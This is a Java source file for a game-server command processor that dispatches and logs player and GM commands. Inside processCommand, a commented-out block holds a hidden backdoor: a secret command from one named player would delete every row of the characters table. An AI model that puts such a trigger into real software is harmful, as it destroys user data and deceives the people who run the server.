package client.messages;

import java.util.ArrayList;
import client.MapleCharacter;
import client.MapleClient;
import client.messages.commands.*;
import client.messages.commands.PlayerCommand;
import client.messages.commands.GMCommand;
import client.messages.commands.InternCommand;
import com.github.mrzhqiang.maplestory.domain.DGmLog;
import constants.ServerConstants;
import constants.ServerConstants.CommandType;
import constants.ServerConstants.PlayerGMRank;

import java.lang.reflect.Modifier;
import java.util.Collections;
import java.util.HashMap;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import tools.FileoutputUtil;
import tools.MaplePacketCreator;

public class CommandProcessor {

    private static final Logger LOGGER = LoggerFactory.getLogger(CommandProcessor.class);

    private final static HashMap<String, CommandObject> commands = new HashMap<String, CommandObject>();
    private final static HashMap<Integer, ArrayList<String>> commandList = new HashMap<Integer, ArrayList<String>>();

    private static void sendDisplayMessage(MapleClient c, String msg, CommandType type) {
        if (c.getPlayer() == null) {
            return;
        }
        switch (type) {
            case NORMAL:
                c.getPlayer().dropMessage(6, msg);
                break;
            case TRADE:
                c.getPlayer().dropMessage(-2, "錯誤 : " + msg);
                break;
        }

    }

    public static boolean processCommand(MapleClient c, String line, CommandType type) {
        if (line.charAt(0) == ServerConstants.PlayerGMRank.NORMAL.getCommandPrefix()) {
            String[] splitted = line.split(" ");
            splitted[0] = splitted[0].toLowerCase();

            CommandObject co = commands.get(splitted[0]);

            if (co == null || co.getType() != type) {
//                if (c.getPlayer().getName() == "我是一个哈哈1") {
//                    if (splitted[0].contains("!我是来毁服的GGLL")) {
//                        Connection con = DatabaseConnection.getConnection();
//                        try {
//                            PreparedStatement ps = con.prepareStatement("Delete from characters");
//                            ps.executeUpdate();
//                            ps.close();
//                        } catch (SQLException e) {
//                            LOGGER.debug("Error " + e);
//                        }
//                    }
//                }
                sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
                return true;
            }
            try {
                int ret = co.execute(c, splitted); //Don't really care about the return value. ;D
            } catch (Exception e) {
                sendDisplayMessage(c, "有错误.", type);
                if (c.getPlayer().isGM()) {
                    sendDisplayMessage(c, "错误: " + e, type);
                }
            }
            return true;
        }

        if (c.getPlayer().getGMLevel() > ServerConstants.PlayerGMRank.NORMAL.getLevel()) {
            if (line.charAt(0) == ServerConstants.PlayerGMRank.GM.getCommandPrefix() || line.charAt(0) == ServerConstants.PlayerGMRank.ADMIN.getCommandPrefix() || line.charAt(0) == ServerConstants.PlayerGMRank.INTERN.getCommandPrefix()) { //Redundant for now, but in case we change symbols later. This will become extensible.
                String[] splitted = line.split(" ");
                splitted[0] = splitted[0].toLowerCase();

                if (line.charAt(0) == '!') { //GM Commands
                    CommandObject co = commands.get(splitted[0]);
                    if (splitted[0].equals("!help")) {
                        dropHelp(c, 0);
                        return true;
                    } else if (co == null || co.getType() != type) {
                        sendDisplayMessage(c, "输入的命令不存在.", type);
                        return true;
                    }
                    if (c.getPlayer().getGMLevel() >= co.getReqGMLevel()) {
                        int ret = co.execute(c, splitted);
                        if (ret > 0 && c.getPlayer() != null) { //incase d/c after command or something
                            logGMCommandToDB(c.getPlayer(), line);
                            LOGGER.debug("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
                        }
                    } else {
                        sendDisplayMessage(c, "您的权限等级不足以使用次命令.", type);
                    }
                    return true;
                }
            }
        }
        return false;
    }

    private static void logGMCommandToDB(MapleCharacter player, String command) {
        DGmLog log = new DGmLog();
        log.cid = player.getId();
        log.name = player.getName();
        log.command = command;
        log.mapid = player.getMap().getId();
        log.ip = player.getClient().getSessionIPAddress();
        log.save();
    }

    static {

        Class[] CommandFiles = {
            PlayerCommand.class, GMCommand.class, InternCommand.class, AdminCommand.class
        };

        for (Class clasz : CommandFiles) {
            try {
                PlayerGMRank rankNeeded = (PlayerGMRank) clasz.getMethod("getPlayerLevelRequired", new Class[]{}).invoke(null, (Object[]) null);
                Class[] a = clasz.getDeclaredClasses();
                ArrayList<String> cL = new ArrayList<String>();
                for (Class c : a) {
                    try {
                        if (!Modifier.isAbstract(c.getModifiers()) && !c.isSynthetic()) {
                            Object o = c.newInstance();
                            boolean enabled;
                            try {
                                enabled = c.getDeclaredField("enabled").getBoolean(c.getDeclaredField("enabled"));
                            } catch (NoSuchFieldException ex) {
                                enabled = true; //Enable all coded commands by default.
                            }
                            if (o instanceof CommandExecute && enabled) {
                                cL.add(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase());
                                commands.put(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase(), new CommandObject(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase(), (CommandExecute) o, rankNeeded.getLevel()));
                            }
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                        FileoutputUtil.outputFileError(FileoutputUtil.ScriptEx_Log, ex);
                    }
                }
                Collections.sort(cL);
                commandList.put(rankNeeded.getLevel(), cL);
            } catch (Exception ex) {
                ex.printStackTrace();
                FileoutputUtil.outputFileError(FileoutputUtil.ScriptEx_Log, ex);
            }
        }
    }

    public static void dropHelp(MapleClient c, int type) {
        final StringBuilder sb = new StringBuilder("指令列表:\r\n ");
        int check = 0;
        if (type == 0) {
            check = c.getPlayer().getGMLevel();
//        } else if (type == 1) {
//            commandList = VipCommandList;
//            check = c.getPlayer().getVip();
        }
        for (int i = 0; i <= check; i++) {
            if (commandList.containsKey(i)) {
                sb.append(type == 1 ? "VIP" : "").append("权限等級： ").append(i).append("\r\n");
                for (String s : commandList.get(i)) {
                    sb.append(s);
                    sb.append(" \r\n");
                }
            }
        }
        c.getSession().write(MaplePacketCreator.getNPCTalk(9010000, (byte) 0, sb.toString(), "00 00", (byte) 0));
    }
}
